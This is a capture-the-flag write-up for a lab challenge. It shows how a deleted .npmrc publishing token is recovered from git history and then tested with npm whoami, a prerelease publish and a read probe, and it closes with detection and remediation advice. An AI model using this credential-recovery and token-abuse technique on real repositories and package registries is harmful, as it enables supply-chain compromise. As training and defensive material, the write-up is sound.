# K06.1 — House credentials

> **Category:** 2. KeplerOps · **Points:** 100 · **Difficulty:** medium
> **Solved by:** team agent

## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | Secret retained in VCS history — a publishing credential deleted from the working tree but still resolvable in earlier commits, with broader authority than its purpose |
| **Tools** | `git`, Gitea REST API, `curl`, `npm` |
| **Attack surface** | `https://source.keplerops.test` (`fieldkest/*`) → `https://packages.keplerops.test` |
| **Prerequisite** | Read access to the Gitea project (range developer credential); route to the service network |
| **Flag** | accepted, value not recorded |

**What you are about to read:** how a "we removed the `.npmrc`" cleanup leaves the
publishing token fully recoverable from the commit that introduced it, and how to prove
what that recovered registry credential can and cannot do before relying on it.

## Objective

The delivery team removed its local npm configuration from the current tree. Recover usable
publishing authority from the retained native history and establish its limits: which
registry operations the token permits.

## Background you need

- **npm auth** lives in `.npmrc` as `//packages.keplerops.test/:_auth=<base64>`, a base64
  `user:token` pair: any clone containing that file holds the credential.
- **Git is append-only.** `git rm .npmrc` writes a new tree; the parent commit still
  references the blob, so the value survives every clone and object store.
- **Publish vs. read authority.** Tokens are scoped; "establish its limits" hints the
  recovered credential is partial — it publishes, but cannot read outside its scope.
- The range reuses an `fk_developer_…` token across Gitea, Jenkins and the registry.

## Walkthrough

### 1. Recon — enumerate the repository, not just the file

```bash
# documented content endpoint
curl -sS --socks5-hostname 127.0.0.1:1080 --cacert /home/kali/ctf/ca.crt \
  -u 'rowan.ito:<fk_developer token>' \
  'https://source.keplerops.test/api/v1/repos/fieldkest/fieldlink-connector/contents/.npmrc?ref=main'
```

`404` on `main` confirms the description. The next step is the commit list: find the commit
that deleted the file, and the one that added it.

### 2. Finding the flaw — the deletion commit is the map

The deleting commit's parent is the last tree that still contains the file:

```text
$ git log --diff-filter=D --name-only -- .npmrc
<sha>  Delivery: drop local npm configuration
.npmrc
$ git show <sha>~1:.npmrc
//packages.keplerops.test/:_auth=cm93YW4uaXRvOmZrX2RldmVsb3Blcl8…
```

The value is the standard npm auth encoding. It is not encrypted, and it does not expire
because the file was removed — the registry still holds the token as valid.

### 3. Exploitation — prove the authority, then probe its edges

Decode into a throwaway config so nothing leaks into the workstation's own `~/.npmrc`:

```bash
AUTH=$(printf '%s' 'cm93YW4uaXRvOmZrX2RldmVsb3Blcl8…' | base64 -d)
printf '//packages.keplerops.test/:_auth=%s\n' "$(printf '%s' "$AUTH" | base64 -w0)" \
  > /tmp/recovered.npmrc
npm --userconfig /tmp/recovered.npmrc whoami --registry https://packages.keplerops.test
npm --userconfig /tmp/recovered.npmrc view @keplerops/support-rehearsal \
  --registry https://packages.keplerops.test     # the limit: refused
```

`whoami` is the cheapest authority check. Then separate write from read: a throwaway
prerelease publish succeeds, the private support package read does not. That asymmetry is
the limit, and it routes K06.2.
### 4. Getting the flag

Solved by a team agent. The retained evidence is challenge metadata only — the
request/response carrying the accepted value was not kept, so the flag is **accepted,
value not recorded**. What is established is the route: publishing authority recovered from
repository history, exercised against `packages.keplerops.test`.

## Why this works (the vulnerability explained)

Secrets in version control are a *retention* problem, not a *deletion* problem.

1. **The secret is durable.** Blobs are content-addressed and commit trees immutable;
   removing a path edits one pointer, leaving the blob reachable from every commit or fork.
2. **The credential is bearer-style and long-lived.** Nothing binds it to a machine, job or
   person, so whoever reads the blob inherits the delivery team's publishing authority.
3. **It is over-broad.** Publishing needs write on one package; the recovered token is
   accepted as a general developer credential, granting more than "publish this artefact".

Correct handling treats a publish as a supply-chain event: per-package tokens, short
expiry, and an audit trail mapping a version to the pushing identity.

## Detection and fix

- **Detect:** history-aware secret scanning (`gitleaks detect --log-opts=--all`,
  `trufflehog git`), not working-tree scans. On the registry, alert on publishes from a
  dormant token and on `whoami`-style probes from an unexpected network position.
- **Fix:** revoke the token — tree removal is cosmetic. Issue a granular token with
  publish-only on one package, rotate on any history rewrite, and require provenance so a
  published version is attributable.
- **Fix the repo:** rewrite history *and* invalidate the value. A rewrite without rotation
  is false comfort; mirrors and caches still hold the old blob.

## Notes and dead ends

- Evidence is thin: only the description and solved-state metadata, no command output. The
  technique (history recovery, capability probing) is **reconstructed**; the commands are
  illustrative, not a transcript.
- The `fk_developer` value is reused across services, so using the base64 npm form against
  Gitea or Jenkins is a dead end — those take the token directly. Do not burn attempts on
  the private support package here; that is K06.2's job.
